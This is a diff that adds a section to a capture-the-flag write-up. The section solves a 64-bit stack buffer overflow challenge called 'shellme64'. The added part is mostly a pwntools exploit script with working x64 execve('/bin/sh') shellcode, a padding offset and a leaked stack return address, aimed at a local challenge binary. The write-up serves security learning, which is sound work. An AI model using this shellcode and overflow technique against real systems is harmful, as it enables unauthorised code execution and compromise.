@@ -120,6 +120,46 @@ p.interactive()
 
 ---
 
+## shellme64 - 480 pts
+
+This is similar to the shellme32 challenge. We just replace the shellcode with a x64 shellcode. And  replace `p32` with `p64` when adding the stack address to the payload.
+
+We use [exploit-db](https://www.exploit-db.com/exploits/42179) to get the shellcode. The offset of the crash is same as before.
+
+```python
+shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
+len_shell_code = 24
+
+from pwn import *
+# context.log_level = 'debug'
+p = process("./shellme64")
+
+offset = 40
+
+
+p.recvuntil('this\n')
+addr = int(p.recvline().strip(), 16)
+p.recvuntil('> ')
+
+log.info('Stack Address: ' + str(hex(addr)))
+
+payload = shellcode
+payload += "A"*(offset - len(shellcode))
+
+# with open('payload', 'wb') as f:
+#     f.write(payload)
+payload += p64(addr)
+
+p.sendline(payload)
+
+with open('payload', 'wb') as f:
+    f.write(payload)
+
+p.interactive()
+```
+
+---
+
 ## printfun - 500 pts
 
 Here, on analysing with Ghidra, we find that there is a format string vulnerability.
